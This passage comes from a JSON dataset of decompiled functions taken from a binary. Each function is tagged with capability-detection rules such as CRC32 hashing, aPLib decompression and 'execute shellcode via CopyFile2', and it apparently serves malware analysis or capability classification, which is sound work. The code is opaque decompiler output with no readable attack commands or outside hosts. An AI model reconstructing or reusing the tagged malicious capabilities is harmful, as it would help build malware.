= ~uVar7 - 1;\ncode_r0x00036532:\n    uVar7 = 0xffffffffffffffff;\n    piVar9 = arg1;\n    do {\n        if (uVar7 == 0) break;\n        uVar7 = uVar7 - 1;\n        iVar1 = *piVar9;\n        piVar9 = piVar9 + 1;\n    } while (iVar1 != 0);\n    iStackX32 = 0;\n    iStack144 = ~uVar7 - 1;\n    uVar2 = fcn.000667d6(uStack152, 0, 0, arg1_00, in_stack_ffffffffffffff58 & 0xffffffff00000000 | uVar4, auStackX8);\n    piVar6 = arg1_01;\n    while (uVar2 != 0x8000001a) {\n        uVar7 = uVar2;\n        if (uVar2 != 0) goto code_r0x00036668;\n        *(arg1_00 + 0x10 + (*(arg1_00 + 0xc) >> 1) * 2) = 0;\n        iVar5 = fcn.00030c98((*(arg1_00 + 0xc) + iStack144 + iVar8) * 2 + 8);\n        *piVar6 = iVar5;\n        if (iVar5 == 0) goto code_r0x000364f9;\n        if (piStackX16 == NULL) {\n            uVar7 = arg1_00 + 0x10;\n            iVar3 = fcn.00066722(iVar5, *(arg1_00 + 0xc) + iStack144 + 4 + iVar8, 0x11b48, arg1, uVar7);\n        }\n        else {\n            uVar7 = arg1_00 + 0x10;\n            iVar3 = fcn.00066722(iVar5, *(arg1_00 + 0xc) + iStack144 + 4 + iVar8, 0x143d8, arg1, uVar7, piStackX16);\n        }\n        if (iVar3 < 0) {\n            uVar7 = 0xc0000001;\n            goto code_r0x00036668;\n        }\n        iStackX32 = iStackX32 + 1;\n        piVar6 = piVar6 + 1;\n        uVar2 = fcn.000667d6(uStack152, iStackX32, 0, arg1_00, uVar7 & 0xffffffff00000000 | uVar4, auStackX8);\n    }\n    uVar7 = 0;\ncode_r0x00036668:\n    if (arg1_00 != 0) {\n        fcn.00030d24(arg1_00);\n    }\n    if (uVar7 == 0) {\n        *arg3 = arg1_01;\n    }\n    else {\ncode_r0x00036679:\n        fcn.00036358(arg1_01);\n    }\n    fcn.000666f2(uStack152);\n    return uVar7;\n}\n",
        "token_count": 1695
    },
    "0004d8f0": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint64_t fcn.0004d8f0(ulong arg1, int64_t arg2, ulong arg3, uint32_t *arg4)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint32_t *puVar4;\n    ulong auStackX16 [3];\n    int64_t iStack64;\n    \n    if (arg2 == 0) {\n        uVar3 = 0x21590066;\n    }\n    else if (arg4 == NULL) {\n        uVar3 = 0x21590068;\n    }\n    else {\n        iVar1 = fcn.000666ec(arg2, 0x15df0);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0004d58c(arg1, 0x15dc8, 0, auStackX16);\n            if (iVar1 == 0) {\n                uVar2 = fcn.0004d458(auStackX16[0], 0x15dc0, 0, 0);\n                uVar3 = uVar2;\n                if (uVar2 == 0) {\n                    while ((uVar2 = uVar3,  uVar2 < *(iStack64 + 4) && (iVar1 = fcn.000666ec(arg2 + 8),  iVar1 != 0))) {\n                        uVar3 = uVar2 + 1;\n                    }\n                    if (uVar2 < *(iStack64 + 4)) {\n                        puVar4 = *(iStack64 + 0x10 + uVar3 * 0xc) + iStack64;\n                        if (*puVar4 == 0) {\n                            *arg4 = 0xffffffff;\n                            uVar3 = 0;\n                        }\n                        else if (*arg4 < *puVar4) {\n                            if (arg3 < puVar4[*arg4 * 4 + 4] + 2) {\n                                uVar3 = 0x2159000b;\n                            }\n                            else {\n                                fcn.0006670a(arg2, puVar4[*arg4 * 4 + 3] + iStack64);\n                                *(arg2 + (puVar4[(*arg4 + 1) * 4] >> 1) * 2) = 0;\n                                if (*arg4 < *puVar4 - 1) {\n                                    *arg4 = *arg4 + 1;\n                                }\n                                else {\n                                    *arg4 = 0xffffffff;\n                                }\n                                uVar3 = 0;\n                            }\n                        }\n                        else {\n                            uVar3 = 0x2159000e;\n                        }\n                    }\n                    else {\n                        *arg4 = 0xffffffff;\n                        uVar3 = 0;\n                    }\n                }\n                fcn.00030d24(auStackX16[0]);\n            }\n            else {\n                *arg4 = 0xffffffff;\n                uVar3 = 0;\n            }\n        }\n        else {\n            *arg4 = 0xffffffff;\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 686
    },
    "0004f4e0": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0004f4e0(ulong arg1, int16_t *arg2)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    uint64_t arg2_00;\n    int64_t arg2_01;\n    int16_t *piVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    char in_R8B;\n    char in_R9B;\n    uint16_t *puVar10;\n    bool bVar11;\n    uint64_t *in_stack_00000028;\n    char acStack484 [4];\n    int16_t aiStack480 [4];\n    int64_t iStack472;\n    int64_t iStack464;\n    uint32_t uStack456;\n    uint uStack452;\n    uint64_t uStack448;\n    int64_t iStack440;\n    uint32_t uStack428;\n    uchar auStack424 [20];\n    uint32_t uStack404;\n    int64_t iStack400;\n    uchar auStack376 [24];\n    uint32_t uStack352;\n    ulong uStack344;\n    uint16_t auStack332 [34];\n    uchar auStack264 [48];\n    uint64_t uStack216;\n    uint16_t auStack192 [8];\n    uint16_t auStack176 [64];\n    \n    iVar6 = -1;\n    piVar7 = arg2;\n    do {\n        if (iVar6 == 0) break;\n        iVar6 = iVar6 + -1;\n        iVar1 = *piVar7;\n        piVar7 = piVar7 + 1;\n    } while (iVar1 != 0);\n    uStack448 = (~iVar6 - 1) * 2;\n    iStack472 = 0;\n    if (arg2 == NULL) {\n        return 0x21590066;\n    }\n    if (in_stack_00000028 == NULL) {\n        return 0x21590069;\n    }\n    *in_stack_00000028 = 0;\n    iVar6 = fcn.00030c98(0x20a);\n    if (iVar6 == 0) {\n        return 0x21590004;\n    }\n    iStack464 = iVar6;\n    uVar4 = fcn.0004cf30(&iStack472, 0x438, arg1);\n    if ((uVar4 == 0) && (uVar4 = fcn.0004cd70(iStack472, acStack484),  uVar4 == 0)) {\n        bVar11 = acStack484[0] == '\\0';\n        uVar4 = fcn.0004cd24(iStack472, acStack484);\n        if (uVar4 == 0) {\n            if (in_R9B == '\\0') {\n                uVar4 = fcn.0004e2d8(iStack472, &uStack456);\n            }\n            else {\n                uVar4 = fcn.0004e30c(iStack472, &uStack456);\n            }\n            if (uVar4 == 0) {\n                if ((bVar11) || ((acStack484[0] != bVar11 && (in_R9B != '\\0')))) {\n                    uVar4 = fcn.0004cdbc(iStack472, CONCAT44(uStack452, uStack456), auStack424, 0x20);\n                    if (uVar4 != 0) goto code_r0x0004f9e1;\n                    if (iStack400 == 0) {\n                        uVar4 = 0xffffffff;\n                        goto code_r0x0004f9e1;\n                    }\n                    uVar4 = fcn.0004cdbc(iStack472, iStack400, auStack376, 0x40);\n                    iVar3 = iStack464;\n                    if (uVar4 != 0) goto code_r0x0004f9e1;\n                    puVar10 = auStack192;\n                    if (in_R8B == '\\0') {\n                        puVar10 = auStack176;\n                    }\n                    do {\n                        do {\n                            do {\n                                arg2_01 = uStack344;\n                                if (arg2_01 == iStack400 + 0x20) goto code_r0x0004f9b8;\n                                uVar4 = fcn.0004cdbc(iStack472, arg2_01, &iStack440, 0x10);\n                                iVar6 = iVar3;\n                                if ((uVar4 != 0) ||\n                                   (uVar4 = fcn.0004cdbc(iStack472, arg2_01 + -0x10, auStack264, 0x88),  uVar4 != 0))\n                                goto code_r0x0004f9e1;\n                                uVar2 = *puVar10;\n                                uStack344 = iStack440;\n                            } while (uStack448 != uVar2);\n                            if ((uVar2 & 0xfffe) < 0x208) {\n                                uVar9 = uVar2 >> 1;\n                            }\n                            else {\n                                uVar9 = 0x104;\n                            }\n                            iVar5 = fcn.0004cdbc(iStack472, *(puVar10 + 4), iVar3, uVar9 * 2);\n                            uStack344 = iStack440;\n                        } while (iVar5 != 0);\n                        *(iVar3 + uVar9 * 2) = 0;\n                        iVar5 = fcn.000666ec(iVar3, arg2);\n                        uStack344 = iStack440;\n                    } while (iVar5 != 0);\n                    uVar4 = fcn.0004cdbc(iStack472, arg2_01 + 0x5c, aiStack480, 2);\n                    if (uVar4 != 0) goto code_r0x0004f9e1;\n                    if (aiStack480[0] != -1) {\n                        aiStack480[0] = aiStack480[0] + 1;\n                        uVar4 = fcn.0004cdec(iStack472, arg2_01 + 0x5c, aiStack480, 2);\n                        if (uVar4 != 0) goto code_r0x0004f9e1;\n                    }\n                    *in_stack_00000028 = uStack216;\n                }\n                else {\n                    uVar4 = fcn.0004cdbc(iStack472, CONCAT44(uStack452, uStack456), &iStack440, 0x10);\n                    if (uVar4 != 0) goto code_r0x0004f9e1;\n                    uVar9 = uStack428;\n                    if (uVar9 == 0) {\n                        uVar4 = uStack428 - 1;\n                        goto code_r0x0004f9e1;\n                    }\n                    uVar4 = fcn.0004cdbc(iStack472, uVar9, auStack424, 0x24);\n                    iVar3 = iStack464;\n                    if (uVar4 != 0) goto code_r0x0004f9e1;\n                    puVar10 = &uStack344 + 4;\n                    if (in_R8B == '\\0') {\n                        puVar10 = auStack332;\n                    }\n                    do {\n                        do {\n                            do {\n                                arg2_00 = uStack404;\n                                if (arg2_00 == uVar9 + 0x14) goto code_r0x0004f9b8;\n                                uVar4 = fcn.0004cdbc(iStack472, arg2_00, &uStack456, 8);\n                                iVar6 = iVar3;\n                                if ((uVar4 != 0) ||\n                                   (uVar4 = fcn.0004cdbc(iStack472, arg2_00 - 8, auStack376, 0x48),  uVar4 != 0))\n                                goto code_r0x0004f9e1;\n                                uVar2 = *puVar10;\n                                uStack404 = uStack456;\n                            } while (uStack448 != uVar2);\n                            if ((uVar2 & 0xfffe) < 0x208) {\n                                uVar8 = uVar2 >> 1;\n                            }\n                            else {\n                                uVar8 = 0x104;\n                            }\n                            iVar5 = fcn.0004cdbc(iStack472, *(puVar10 + 2), iVar3, uVar8 * 2);\n                            uStack404 = uStack456;\n                        } while (iVar5 != 0);\n                        *(iVar3 + uVar8 * 2) = 0;\n                        iVar5 = fcn.000666ec(iVar3, arg2);\n                        uStack404 = uStack456;\n                    } while (iVar5 != 0);\n                    uVar4 = fcn.0004cdbc(iStack472, arg2_00 + 0x30, aiStack480, 2);\n                    if (uVar4 != 0) goto code_r0x0004f9e1;\n                    if (aiStack480[0] != -1) {\n                        aiStack480[0] = aiStack480[0] + 1;\n                        uVar4 = fcn.0004cdec(iStack472, arg2_00 + 0x30, aiStack480, 2);\n                        if (uVar4 != 0) goto code_r0x0004f9e1;\n                    }\n                    *in_stack_00000028 = uStack352;\n                }\ncode_r0x0004f9b8:\n                uVar4 = ~-(*in_stack_00000028 != 0) & 0x21590005;\n                iVar6 = iStack464;\n            }\n        }\n    }\ncode_r0x0004f9e1:\n    if (iStack472 != 0) {\n        fcn.000666f2();\n    }\n    fcn.00030d24(iVar6);\n    return uVar4;\n}\n",
        "token_count": 2221
    },
    "00059c10": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.00059c10(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    uint8_t *puVar8;\n    uchar *puVar9;\n    uchar *puVar10;\n    uint8_t uVar11;\n    int32_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    int32_t *in_stack_00000038;\n    uint32_t uStack136;\n    uint8_t uStack132;\n    uint32_t uStack128;\n    uint8_t uStack124;\n    uint32_t auStack88 [14];\n    \n    if ((arg4 < 0x1d) && (iVar2 = fcn.00059a04(arg1, arg2, &uStack136, 0),  iVar2 != 0)) {\n        uStack128 = uStack136 & 0xff00ffff;\n        uStack124 = ((uStack132 ^ arg4) & 0x1f ^ uStack132) & 0xbf;\n        uStack124 = uStack124 ^ ((in_stack_00000028 != 0) << 5 ^ uStack124) & 0x20;\n        fcn.0006670a();\n        arg4._0_4_ = arg4 + 5;\n        uVar11 = 0;\n        if (arg4 != 0) {\n            puVar5 = &uStack128;\n            uVar7 = arg4;\n            uVar11 = 0;\n            do {\n                uVar11 = uVar11 + *puVar5;\n                puVar5 = puVar5 + 1;\n                uVar7 = uVar7 - 1;\n            } while (uVar7 != 0);\n            if (arg4 != 0) {\n                puVar5 = &uStack128;\n                uVar7 = arg4;\n                do {\n                    *puVar5 = *puVar5 ^ uVar11 >> 1;\n                    puVar5 = puVar5 + 1;\n                    uVar7 = uVar7 - 1;\n                } while (uVar7 != 0);\n            }\n        }\n        uStack128._0_3_ = CONCAT12(uVar11, uStack128);\n        uStack128 = uStack128 & 0xff000000 | uStack128;\n        uVar3 = fcn.00059908(&uStack128, arg4, auStack88);\n        uVar7 = uVar3;\n        if (*(arg1 + 0xc) != '\\0') {\n            for (puVar8 = *(arg1 + 0xc) + 0xd + arg1; *puVar8 != 0; puVar8 = puVar8 + (*puVar8 + 1)) {\n            }\n            uVar6 = (puVar8 - arg1) + 5;\n            if (uVar6 < 0x81) {\n                fcn.0006670a(in_stack_00000030, arg1, uVar6);\n                *(in_stack_00000030 + 2) = *(in_stack_00000030 + 2) | 0x84;\n                *(in_stack_00000030 + 3) = *(in_stack_00000030 + 3) & 0xf0 | 0x80;\n                uVar1 = fcn.00030df4(uVar7 & 0xffff);\n                puVar9 = uVar6 + in_stack_00000030;\n                *(in_stack_00000030 + 8) = 0;\n                *(in_stack_00000030 + 10) = 0;\n                *(in_stack_00000030 + 6) = uVar1;\n                if (uVar3 != 0) {\n                    puVar5 = auStack88;\n                    puVar10 = puVar9;\n                    do {\n                        *puVar10 = 0xc0;\n                        puVar10[1] = 0xc;\n                        uVar1 = fcn.00030df4(1);\n                        *(puVar10 + 2) = uVar1;\n                        uVar1 = fcn.00030df4(1);\n                        *(puVar10 + 4) = uVar1;\n                        uVar4 = fcn.00030dc8(0x3c);\n                        *(puVar10 + 6) = uVar4;\n                        uVar1 = fcn.00030df4();\n                        *(puVar10 + 10) = uVar1;\n                        *(puVar10 + 0xc) = *puVar5;\n                        uVar4 = fcn.00030dc8(*puVar5);\n                        puVar9 = puVar10 + 0x10;\n                        puVar5 = puVar5 + 1;\n                        uVar7 = uVar7 - 1;\n                        *(puVar10 + 0xc) = uVar4;\n                        puVar10 = puVar9;\n                    } while (uVar7 != 0);\n                }\n                *in_stack_00000038 = puVar9 - in_stack_00000030;\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1185
    },
    "00060cd8": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nulong fcn.00060cd8(int64_t arg1, uchar *arg2, ulong arg3, uint8_t *arg4)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar *puStack360;\n    uint8_t *puStack352;\n    uint uStack344;\n    uchar auStack336 [8];\n    uchar *puStack328;\n    int32_t iStack320;\n    uchar auStack312 [264];\n    \n    if (arg1 == 0) {\n        uVar3 = 0x21590065;\n    }\n    else {\n        fcn.0006677c(&puStack360);\n        uStack344 = 3;\n        puStack360 = arg2;\n        puStack352 = arg4;\n        if (((arg3 & 8) == 0) && (arg2 == NULL)) {\n            puStack360 = auStack336;\n            iVar2 = fcn.000667b8();\n            iStack320 = iVar2 % *(arg1 + 100) + 1;\n            iVar4 = 0;\n            if (0 < iStack320) {\n                do {\n                    uVar1 = fcn.000667b8();\n                    iVar5 = iVar4 + 1;\n                    auStack312[iVar4] = uVar1;\n                    iVar4 = iVar5;\n                } while (iVar5 < iStack320);\n            }\n            puStack328 = auStack312;\n        }\n        *arg4 = *arg4 ^ arg4[2] >> 1;\n        arg4[1] = arg4[1] ^ arg4[2] >> 1;\n        uVar3 = fcn.00064248(*(arg1 + 8), &puStack360, arg3);\n        *arg4 = *arg4 ^ arg4[2] >> 1;\n        arg4[1] = arg4[1] ^ arg4[2] >> 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 445
    },
    "0001952c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.0001952c(int16_t **arg1, int32_t **arg2, ulong noname_2, uint64_t arg4)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    int32_t *piVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int16_t *piVar7;\n    int16_t *piVar8;\n    int64_t *in_stack_00000028;\n    int16_t aiStack72 [14];\n    ushort uStack44;\n    \n    if (arg1 == NULL) {\n        uVar3 = 0xc0000001;\n    }\n    else {\n        if ((arg4 == 0) || (arg1[6] + *in_stack_00000028 <= arg4)) {\n            uVar5 = 0xffffffffffffffff;\n            piVar7 = *arg1;\n            do {\n                if (uVar5 == 0) break;\n                uVar5 = uVar5 - 1;\n                iVar1 = *piVar7;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n            piVar4 = fcn.00030c98(~uVar5 * 2 + 0xc6);\n            if (piVar4 != NULL) {\n                fcn.0006677c(piVar4, 0, 0xa8);\n                piVar7 = piVar4 + 0xc6;\n                *(piVar4 + 2) = piVar7;\n                iVar6 = -1;\n                piVar8 = *arg1;\n                do {\n                    if (iVar6 == 0) break;\n                    iVar6 = iVar6 + -1;\n                    iVar1 = *piVar8;\n                    piVar8 = piVar8 + 1;\n                } while (iVar1 != 0);\n                *piVar4 = ~iVar6 * 2;\n                piVar8 = *arg1;\n                do {\n                    iVar1 = *piVar8;\n                    piVar8 = piVar8 + 1;\n                    *piVar7 = iVar1;\n                    piVar7 = piVar7 + 1;\n                } while (iVar1 != 0);\n                piVar4[6] = 0x1e;\n                piVar7 = aiStack72;\n                *(piVar4 + 8) = piVar4 + 0x2a;\n                uVar2 = *(arg1 + 5);\n                piVar8 = 0x69004;\n                iVar6 = 0xe;\n                do {\n                    if ((*(piVar8 + -2) & uVar2) == 0) {\n                        *piVar7 = 0x2d;\n                    }\n                    else {\n                        *piVar7 = *piVar8;\n                    }\n                    piVar8 = piVar8 + 4;\n                    piVar7 = piVar7 + 1;\n                    iVar6 = iVar6 + -1;\n                } while (iVar6 != 0);\n                uStack44 = 0;\n                piVar7 = aiStack72;\n                do {\n                    iVar1 = *piVar7;\n                    *(((piVar4 + 0x2a) - aiStack72) + piVar7) = iVar1;\n                    piVar7 = piVar7 + 1;\n                } while (iVar1 != 0);\n                *(piVar4 + 0xe) = piVar4 + 0x10;\n                piVar4[0xc] = 4;\n                piVar4[0x10] = *(arg1 + 6);\n                piVar4[0x12] = 4;\n                *(piVar4 + 0x14) = piVar4 + 0x16;\n                piVar4[0x16] = *(arg1 + 2);\n                piVar4[0x18] = 4;\n                *(piVar4 + 0x1a) = piVar4 + 0x1c;\n                piVar4[0x1c] = *(arg1 + 3);\n                piVar4[0x1e] = 4;\n                *(piVar4 + 0x20) = piVar4 + 0x22;\n                piVar4[0x22] = *(arg1 + 1);\n                piVar4[0x24] = 4;\n                *(piVar4 + 0x26) = piVar4 + 0x28;\n                piVar4[0x28] = *(arg1 + 4);\n                *arg2 = piVar4;\n                if (in_stack_00000028 != NULL) {\n                    *in_stack_00000028 = *in_stack_00000028 + arg1[6];\n                }\n                return 0;\n            }\n        }\n        uVar3 = 0xc000009a;\n    }\n    return uVar3;\n}\n",
        "token_count": 1074
    },
    "0001a5bc": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0001a746)\n\nuint64_t fcn.0001a5bc(ulong arg1, uint64_t arg2, ulong noname_2, code *arg4)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    uint64_t arg1_00;\n    char acStackX8 [24];\n    int64_t iStackX32;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint64_t in_stack_00000030;\n    ulong in_stack_00000038;\n    int64_t iVar6;\n    int64_t iStack80;\n    uint64_t uStack72;\n    uint64_t uStack64;\n    \n    iVar6 = CONCAT44(in_stack_0000002c, in_stack_00000028);\n    arg1_00 = arg1;\n    iStackX32 = 0;\n    puVar5 = -(iVar6 != 0) & in_stack_00000030;\n    if (arg4 == NULL) {\n        arg4 = fcn.000207c4;\n    }\n    uStack64 = arg2 & 0xffffffff;\n    uStack72 = arg1_00;\n    uVar3 = (**0x111e8)(&uStack72, 0);\n    if (uVar3 != 0) {\n        return uVar3;\n    }\n    iVar4 = fcn.00030cc4(0x58);\n    if (iVar4 == 0) {\n        uVar2 = 0xc0000017;\n    }\n    else {\n        uVar2 = fcn.0001a4e0(arg1_00, acStackX8);\n        if (uVar2 == 0) {\n            if (acStackX8[0] != '\\0') {\n                uVar2 = fcn.0004f4e0(arg1, 0x11b00);\n                if ((uVar2 != 0) || (uVar2 = fcn.000519cc(arg1_00, 0, 0x11af0, &iStack80),  uVar2 != 0))\n                goto code_r0x0001a73c;\n                in_stack_00000028 = SUB84(puVar5, 0);\n                arg4 = fcn.000207c4;\n                iVar6 = iStack80;\n                puVar5 = &stack0x00000028;\n            }\n            (**0x111e0)(iVar4, iStackX32, 0, arg4, 0, iVar6, noname_2, puVar5);\n            cVar1 = (**0x111d8)(iVar4, in_stack_00000038, 0, 0);\n            uVar2 = ~-(cVar1 != '\\0') & 0xc0000001;\n        }\n    }\ncode_r0x0001a73c:\n    if (iStackX32 != 0) {\n        (*_fcn.000115b8)();\n    }\n    if ((uVar2 != 0) && (iVar4 != 0)) {\n        (**0x11170)(iVar4, 0);\n    }\n    return uVar2;\n}\n",
        "token_count": 726
    },
    "0001d430": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.0001d430(ulong noname_0, ulong arg2, ulong arg3, uint *arg4)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t *in_stack_00000028;\n    int32_t *in_stack_00000030;\n    int32_t iStack2168;\n    uint32_t uStack2164;\n    uint *puStack2160;\n    uint32_t auStack2152 [4];\n    uchar auStack2136 [768];\n    uchar auStack1368 [1352];\n    \n    iVar1 = fcn.0002bdd8(arg3, auStack1368, auStack2136);\n    if (iVar1 == 0) {\n        uVar3 = 0xffffffff;\n    }\n    else {\n        uVar3 = fcn.00064fb8(*0x7e7e0, arg2, auStack2136, &uStack2164);\n        if (uVar3 == 0) {\n            iVar1 = fcn.00064db0(*0x7e7e0, uStack2164, &puStack2160, &iStack2168);\n            if (iVar1 == 0) {\n                if (iStack2168 == 4) {\n                    *arg4 = *puStack2160;\n                }\n                fcn.00064a1c(*0x7e7e0, puStack2160);\n            }\n            uVar2 = fcn.00064ecc(*0x7e7e0, uStack2164, auStack2152, &puStack2160);\n            uVar3 = uVar2;\n            if (uVar2 == 0) {\n                uVar3 = auStack2152[0];\n                if (0 < iStack2168) {\n                    iVar4 = fcn.00030c98(iStack2168);\n                    *in_stack_00000028 = iVar4;\n                    if (iVar4 == 0) {\n                        uVar3 = 0x21590004;\n                    }\n                    else {\n                        fcn.0006670a(iVar4, puStack2160, iStack2168);\n                        *in_stack_00000030 = iStack2168;\n                    }\n                }\n                fcn.00064a1c(*0x7e7e0, puStack2160);\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 544
    },
    "0001e098": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0001e098(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    char *pcVar4;\n    ulong uStack120;\n    ulong uStack112;\n    char acStack104 [96];\n    \n    uStack120 = 0x11d60;\n    uStack112 = 0;\n    fcn.0002923c(acStack104, 0x52);\n    iVar3 = -1;\n    pcVar4 = acStack104;\n    do {\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = fcn.000646b8(0x7e7d8, &uStack120, acStack104, ~iVar3);\n    if (iVar2 == 0) {\n        fcn.00064bd8(*0x7e7d8, 0x1d180, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 249
    },
    "00020a98": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.00020a98(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    int32_t iVar8;\n    uchar auStack184 [48];\n    uint32_t uStack136;\n    uint32_t uStack132;\n    uint32_t uStack128;\n    uint32_t uStack92;\n    \n    iVar3 = 0;\n    iVar4 = 0;\n    iVar8 = 0;\n    if (arg1 == 0) {\n        return -1;\n    }\n    fcn.000206a8(arg1);\n    fcn.0006670a(auStack184, arg1 + 8, 0x2c);\n    uVar6 = *(arg1 + 8);\n    if (uVar6 <= *(arg1 + 0x1c) && *(arg1 + 0x1c) != uVar6) {\n        *(arg1 + 0x1c) = uVar6;\n        iVar2 = (**(*(arg1 + 0x58) + 0x30))(*(arg1 + 0x60), arg1 + 8, 0x2c);\n        if (iVar2 != 0) goto code_r0x00020c68;\n    }\n    uVar7 = 0x2c;\n    uVar6 = 0x2c;\n    if (0x2c < *(arg1 + 0x1c)) {\n        do {\n            uVar6 = uVar7;\n            iVar2 = (**(*(arg1 + 0x58) + 0x28))(*(arg1 + 0x60), &uStack136);\n            if (iVar2 != 0) goto code_r0x00020c68;\n            if (((*(arg1 + 0x1c) < uVar7 + 0x40) || (uVar1 = uStack92 + 0x40 + uVar7,  uVar1 <= uVar7)) ||\n               (*(arg1 + 0x1c) < uVar1)) break;\n            if (uStack128 == 0xffff) {\n                iVar4 = iVar4 + 1;\n            }\n            else {\n                iVar8 = iVar8 + 1;\n                for (puVar5 = *(arg1 + 0x38); puVar5 != NULL; puVar5 = *(puVar5 + 8)) {\n                    if ((*puVar5 == uStack136) && (puVar5[1] == uStack128)) {\n                        if (puVar5[3] <= uStack132 && uStack132 != puVar5[3]) {\n                            puVar5[3] = uStack132;\n                        }\n                        if (uStack132 < puVar5[2]) {\n                            puVar5[2] = uStack132;\n                        }\n                        goto code_r0x00020bd6;\n                    }\n                }\n                fcn.0002072c(arg1, uStack136, uStack128, uStack132);\ncode_r0x00020bd6:\n                iVar3 = fcn.000207f8(arg1, uStack136, uStack128, uStack132);\n                if (iVar3 != 0) goto code_r0x00020c6d;\n            }\n            uVar6 = uVar6 + 0x40 + uStack92;\n            uVar7 = uVar6;\n        } while (uVar6 < *(arg1 + 0x1c));\n    }\n    *(arg1 + 0x1c) = uVar6;\n    *(arg1 + 0x18) = iVar8;\n    *(arg1 + 0x20) = iVar4;\n    iVar4 = fcn.0006674c(arg1 + 8, auStack184, 0x2c, 1, 1);\n    if (iVar4 == 0) {\n        return iVar3;\n    }\n    *(arg1 + 0x2c) = *(arg1 + 0x2c) + 1;\n    iVar4 = (**(*(arg1 + 0x58) + 0x30))(*(arg1 + 0x60), arg1 + 8, 0x2c, 0);\n    if (iVar4 == 0) {\n        return iVar3;\n    }\ncode_r0x00020c68:\n    iVar3 = 3;\ncode_r0x00020c6d:\n    fcn.0006670a(arg1 + 8, auStack184, 0x2c);\n    return iVar3;\n}\n",
        "token_count": 1037
    },
    "00020d30": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.00020d30(int64_t arg1)\n\n{\n    uint32_t *arg2;\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint64_t uVar3;\n    uint32_t *puVar4;\n    uint32_t uStack104;\n    uint32_t uStack100;\n    uint32_t uStack96;\n    uint32_t uStack92;\n    uint32_t uStack60;\n    \n    uVar3 = 0x2c;\n    iVar1 = 0;\n    (**(*(arg1 + 0x58) + 0x38))(*(arg1 + 0x60), 2);\n    puVar2 = *(arg1 + 0x40);\n    while (puVar2 != NULL) {\n        puVar4 = *(puVar2 + 10);\n        iVar1 = (**(*(arg1 + 0x58) + 0x28))(*(arg1 + 0x60), &uStack104);\n        if (iVar1 != 0) goto code_r0x00020f2a;\n        puVar2[3] = uVar3;\n        if (((*puVar2 == uStack100) && (puVar2[1] == uStack60)) && (puVar2[2] == uStack92)) {\n            arg2 = *(puVar2 + 0xc);\n            if ((*arg2 != uStack104) || (arg2[1] != uStack96)) {\n                if (uStack96 == 0xffff) {\n                    if (uStack104 != *arg2) goto code_r0x00020f2a;\n                    fcn.00020948(arg1, arg2, *puVar2, 0);\n                }\n                else {\n                    if (uStack104 != *arg2) goto code_r0x00020f2a;\n                    